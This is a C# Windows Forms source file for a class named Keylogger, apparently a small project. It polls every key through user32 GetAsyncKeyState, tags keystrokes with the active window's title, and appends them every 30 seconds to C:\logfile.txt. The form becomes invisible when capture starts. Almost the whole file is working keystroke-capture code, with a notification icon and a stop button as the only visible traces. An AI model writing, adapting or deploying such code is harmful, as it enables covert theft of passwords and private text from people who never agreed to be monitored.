using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace idpaClient
{
    public partial class Keylogger : Form
    {
        public const int KEY_LOG_TIMER = 10;
        public const int LOG_WRITE_TIMER = 30000; //30 sek
        private const string LOG_PATH = @"C:\logfile.txt";

        private StringBuilder keyBuffer;
        private string activeWindow;

        public Keylogger()
        {
            InitializeComponent();
        }
        //Import DDLs form Windows (needed for Captioring Keys)
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private void Keylogger_Load(object sender, EventArgs e)
        {
            keyBuffer = new StringBuilder();
            activeWindow = "";
        }

        void CreateLog(string file)
        {
            try
            {
                StreamWriter sw = new StreamWriter(file, true);//I used true to append log to file
                sw.Write(keyBuffer.ToString());
                sw.Close();
                keyBuffer.Clear(); // reset buffer
            }
            catch
            {
            }
        }

        private void key_Tick(object sender, EventArgs e)
        {
            if (activeWindow != GetActiveWindowTitle())
            {
                activeWindow = GetActiveWindowTitle();
                keyBuffer.Append("\r\n\r\n" + activeWindow + "\r\n");
            }
            
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys))) //Iterate through each key to know whether it was pressed or not
            {
                if (GetAsyncKeyState(i) == -32767)   //-32767(minimum value) indicates that key was pressed since we last called this function
                {
                    keyBuffer.Append(Enum.GetName(typeof(Keys), i));
                    keyBuffer.Append(' ');
                }
            }
        }

        private void log_Tick(object sender, EventArgs e)
        {
            CreateLog(LOG_PATH);
            notifyIcon1.BalloonTipText = "Log File written";
            notifyIcon1.ShowBalloonTip(5000);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Opacity = 0;
            key.Enabled = true;
            log.Enabled = true;
            notifyIcon1.ShowBalloonTip(5000);
            button2.Enabled = true;
            button1.Enabled = false;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            key.Enabled = false;
            log.Enabled = false;
            button1.Enabled = true;
            button2.Enabled = false;
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Opacity = 1;
        }

        private string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
    }
}
